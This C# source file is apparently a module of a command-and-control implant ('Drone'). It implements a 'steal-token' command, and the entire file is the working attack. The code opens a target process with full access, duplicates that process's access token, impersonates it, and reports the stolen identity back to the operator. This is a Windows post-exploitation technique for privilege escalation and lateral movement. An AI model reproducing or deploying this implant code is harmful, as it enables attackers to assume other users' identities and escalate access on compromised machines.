using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Functions;

public class StealToken : DroneFunction
{
    public override string Name => "steal-token";

    public override void Execute(DroneTask task)
    {
        // open target process
        var pid = uint.Parse(task.Parameters[0]);
        
        var hProcess = Native.NtOpenProcess(
            pid,
            (uint)Win32.PROCESS_ACCESS_FLAGS.PROCESS_ALL_ACCESS);

        if (hProcess == IntPtr.Zero)
        {
            Drone.SendError(task.TaskId, "Failed to open process handle.");
            return;
        }

        // open process token
        var hToken = Win32.OpenProcessToken(
            hProcess,
            Win32.TOKEN_ACCESS.TOKEN_ALL_ACCESS);

        if (hToken == IntPtr.Zero)
        {
            Win32.CloseHandle(hProcess);
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        // duplicate token
        var hTokenDup = Win32.DuplicateTokenEx(
            hToken,
            Win32.TOKEN_ACCESS.TOKEN_ALL_ACCESS,
            Win32.SECURITY_IMPERSONATION_LEVEL.SECURITY_IMPERSONATION,
            Win32.TOKEN_TYPE.TOKEN_IMPERSONATION);

        Win32.CloseHandle(hProcess);
        Win32.CloseHandle(hToken);

        if (hTokenDup == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error());

        // impersonate token
        var success = Win32.ImpersonateToken(hTokenDup);

        if (success)
        {
            using var identity = new WindowsIdentity(hTokenDup);
            Drone.SendOutput(task.TaskId, $"Impersonated token for {identity.Name}.");
        }
        else
        {
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }
        
        // throws exception?
        // Win32.CloseHandle(hTokenDup);
    }
}